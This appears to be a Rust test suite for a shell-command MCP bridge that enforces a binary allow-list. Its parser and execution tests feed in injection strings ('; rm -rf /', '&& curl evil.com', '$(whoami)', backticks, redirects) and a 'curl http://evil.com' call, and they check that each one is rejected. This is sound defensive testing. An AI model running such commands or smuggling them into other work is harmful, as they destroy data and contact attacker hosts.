use std::io::Write;
use tempfile::NamedTempFile;

mod config_tests {
    use super::*;

    #[test]
    fn test_parse_valid_config() {
        let toml_content = r#"
[server]
host = "127.0.0.1"
port = 8741
timeout = 120

[allowed]
bins = ["gog", "uv"]
"#;
        let mut f = NamedTempFile::new().unwrap();
        f.write_all(toml_content.as_bytes()).unwrap();

        let config = bash_mcp_bridge::config::Config::from_file(f.path()).unwrap();
        assert_eq!(config.server.host, "127.0.0.1");
        assert_eq!(config.server.port, 8741);
        assert_eq!(config.server.timeout, 120);
        assert_eq!(config.allowed.bins, vec!["gog", "uv"]);
    }

    #[test]
    fn test_parse_config_defaults() {
        let toml_content = r#"
[allowed]
bins = ["gog"]
"#;
        let mut f = NamedTempFile::new().unwrap();
        f.write_all(toml_content.as_bytes()).unwrap();

        let config = bash_mcp_bridge::config::Config::from_file(f.path()).unwrap();
        assert_eq!(config.server.host, "127.0.0.1");
        assert_eq!(config.server.port, 8741);
        assert_eq!(config.server.timeout, 120);
    }

    #[test]
    fn test_parse_config_empty_bins_allowed() {
        let toml_content = r#"
[allowed]
bins = []
"#;
        let mut f = NamedTempFile::new().unwrap();
        f.write_all(toml_content.as_bytes()).unwrap();

        let config = bash_mcp_bridge::config::Config::from_file(f.path()).unwrap();
        assert!(config.allowed.bins.is_empty());
    }
}

mod reload_tests {
    use super::*;

    #[test]
    fn test_config_reload_updates_bins() {
        let toml_content = r#"
[allowed]
bins = ["gog"]
"#;
        let mut f = NamedTempFile::new().unwrap();
        f.write_all(toml_content.as_bytes()).unwrap();

        let store = bash_mcp_bridge::config::ConfigStore::new(f.path()).unwrap();
        assert_eq!(store.allowed_bins(), vec!["gog"]);

        let new_content = r#"
[allowed]
bins = ["gog", "uv", "cargo"]
"#;
        std::fs::write(f.path(), new_content).unwrap();
        store.reload().unwrap();
        assert_eq!(store.allowed_bins(), vec!["gog", "uv", "cargo"]);
    }
}

mod executor_tests {
    #[test]
    fn test_parse_simple_command() {
        let parsed = bash_mcp_bridge::executor::parse_command("gog calendar events foo").unwrap();
        assert_eq!(parsed.binary, "gog");
        assert_eq!(parsed.args, vec!["calendar", "events", "foo"]);
    }

    #[test]
    fn test_parse_command_with_quotes() {
        let parsed = bash_mcp_bridge::executor::parse_command(
            r#"gog calendar create foo --summary "My Event""#,
        )
        .unwrap();
        assert_eq!(parsed.binary, "gog");
        assert_eq!(
            parsed.args,
            vec!["calendar", "create", "foo", "--summary", "My Event"]
        );
    }

    #[test]
    fn test_reject_pipe() {
        let result = bash_mcp_bridge::executor::parse_command("gog events | grep foo");
        assert!(result.is_err());
        assert!(result.unwrap_err().to_string().contains("metacharacter"));
    }

    #[test]
    fn test_reject_semicolon() {
        let result = bash_mcp_bridge::executor::parse_command("gog events; rm -rf /");
        assert!(result.is_err());
    }

    #[test]
    fn test_reject_and_chain() {
        let result = bash_mcp_bridge::executor::parse_command("gog events && curl evil.com");
        assert!(result.is_err());
    }

    #[test]
    fn test_reject_or_chain() {
        let result = bash_mcp_bridge::executor::parse_command("gog events || curl evil.com");
        assert!(result.is_err());
    }

    #[test]
    fn test_reject_subshell() {
        let result = bash_mcp_bridge::executor::parse_command("gog events $(whoami)");
        assert!(result.is_err());
    }

    #[test]
    fn test_reject_backticks() {
        let result = bash_mcp_bridge::executor::parse_command("gog events `whoami`");
        assert!(result.is_err());
    }

    #[test]
    fn test_reject_redirect() {
        let result = bash_mcp_bridge::executor::parse_command("gog events > /tmp/out");
        assert!(result.is_err());
    }

    #[test]
    fn test_reject_background() {
        let result = bash_mcp_bridge::executor::parse_command("gog events &");
        assert!(result.is_err());
    }

    #[test]
    fn test_reject_empty_command() {
        let result = bash_mcp_bridge::executor::parse_command("");
        assert!(result.is_err());
    }
}

mod execution_tests {
    #[tokio::test]
    async fn test_execute_allowed_command() {
        let allowed = vec!["echo".to_string()];
        let result =
            bash_mcp_bridge::executor::execute("echo hello world", &allowed, 30).await.unwrap();
        assert_eq!(result.exit_code, 0);
        assert_eq!(result.stdout.trim(), "hello world");
        assert!(result.stderr.is_empty());
    }

    #[tokio::test]
    async fn test_execute_rejected_binary() {
        let allowed = vec!["echo".to_string()];
        let result =
            bash_mcp_bridge::executor::execute("curl http://evil.com", &allowed, 30).await;
        assert!(result.is_err());
        assert!(result
            .unwrap_err()
            .to_string()
            .contains("not in the allowed list"));
    }

    #[tokio::test]
    async fn test_execute_nonzero_exit() {
        let allowed = vec!["false".to_string()];
        let result = bash_mcp_bridge::executor::execute("false", &allowed, 30).await.unwrap();
        assert_ne!(result.exit_code, 0);
    }

    #[tokio::test]
    async fn test_execute_timeout() {
        let allowed = vec!["sleep".to_string()];
        let result = bash_mcp_bridge::executor::execute("sleep 60", &allowed, 1).await;
        assert!(result.is_err());
        assert!(result.unwrap_err().to_string().contains("timed out"));
    }

    #[tokio::test]
    async fn test_execute_binary_not_found() {
        let allowed = vec!["nonexistent_binary_xyz".to_string()];
        let result =
            bash_mcp_bridge::executor::execute("nonexistent_binary_xyz", &allowed, 30).await;
        assert!(result.is_err());
    }
}

mod e2e_tests {
    use std::io::Write;
    use std::process::Stdio;
    use tempfile::NamedTempFile;
    use tokio::io::{AsyncBufReadExt, AsyncWriteExt, BufReader};
    use tokio::process::Command;

    #[tokio::test]
    async fn test_e2e_execute_allowed() {
        let config = r#"
[allowed]
bins = ["echo"]
"#;
        let mut f = NamedTempFile::new().unwrap();
        f.write_all(config.as_bytes()).unwrap();

        let mut child = Command::new(env!("CARGO_BIN_EXE_bash-mcp-bridge"))
            .args(["-c", f.path().to_str().unwrap(), "-t", "stdio"])
            .stdin(Stdio::piped())
            .stdout(Stdio::piped())
            .stderr(Stdio::null())
            .spawn()
            .expect("failed to start server");

        let mut stdin = child.stdin.take().unwrap();
        let stdout = child.stdout.take().unwrap();
        let mut reader = BufReader::new(stdout).lines();

        // Initialize
        let init_msg = serde_json::json!({
            "jsonrpc": "2.0",
            "id": 1,
            "method": "initialize",
            "params": {
                "protocolVersion": "2024-11-05",
                "capabilities": {},
                "clientInfo": {"name": "test", "version": "0.1"}
            }
        });
        stdin
            .write_all(format!("{}\n", init_msg).as_bytes())
            .await
            .unwrap();
        let response = reader.next_line().await.unwrap().unwrap();
        assert!(response.contains("bash-mcp-bridge"));

        // Send initialized notification
        let initialized = serde_json::json!({
            "jsonrpc": "2.0",
            "method": "notifications/initialized"
        });
        stdin
            .write_all(format!("{}\n", initialized).as_bytes())
            .await
            .unwrap();

        // Call execute tool
        let call_msg = serde_json::json!({
            "jsonrpc": "2.0",
            "id": 2,
            "method": "tools/call",
            "params": {
                "name": "execute",
                "arguments": {"command": "echo hello from bridge"}
            }
        });
        stdin
            .write_all(format!("{}\n", call_msg).as_bytes())
            .await
            .unwrap();
        let response = reader.next_line().await.unwrap().unwrap();
        assert!(response.contains("hello from bridge"));

        child.kill().await.ok();
    }

    #[tokio::test]
    async fn test_e2e_execute_rejected() {
        let config = r#"
[allowed]
bins = ["echo"]
"#;
        let mut f = NamedTempFile::new().unwrap();
        f.write_all(config.as_bytes()).unwrap();

        let mut child = Command::new(env!("CARGO_BIN_EXE_bash-mcp-bridge"))
            .args(["-c", f.path().to_str().unwrap(), "-t", "stdio"])
            .stdin(Stdio::piped())
            .stdout(Stdio::piped())
            .stderr(Stdio::null())
            .spawn()
            .expect("failed to start server");

        let mut stdin = child.stdin.take().unwrap();
        let stdout = child.stdout.take().unwrap();
        let mut reader = BufReader::new(stdout).lines();

        // Initialize
        let init_msg = serde_json::json!({
            "jsonrpc": "2.0",
            "id": 1,
            "method": "initialize",
            "params": {
                "protocolVersion": "2024-11-05",
                "capabilities": {},
                "clientInfo": {"name": "test", "version": "0.1"}
            }
        });
        stdin
            .write_all(format!("{}\n", init_msg).as_bytes())
            .await
            .unwrap();
        reader.next_line().await.unwrap();

        let initialized = serde_json::json!({
            "jsonrpc": "2.0",
            "method": "notifications/initialized"
        });
        stdin
            .write_all(format!("{}\n", initialized).as_bytes())
            .await
            .unwrap();

        // Call execute with rejected binary
        let call_msg = serde_json::json!({
            "jsonrpc": "2.0",
            "id": 2,
            "method": "tools/call",
            "params": {
                "name": "execute",
                "arguments": {"command": "curl http://evil.com"}
            }
        });
        stdin
            .write_all(format!("{}\n", call_msg).as_bytes())
            .await
            .unwrap();
        let response = reader.next_line().await.unwrap().unwrap();
        assert!(response.contains("not in the allowed list"));

        child.kill().await.ok();
    }
}
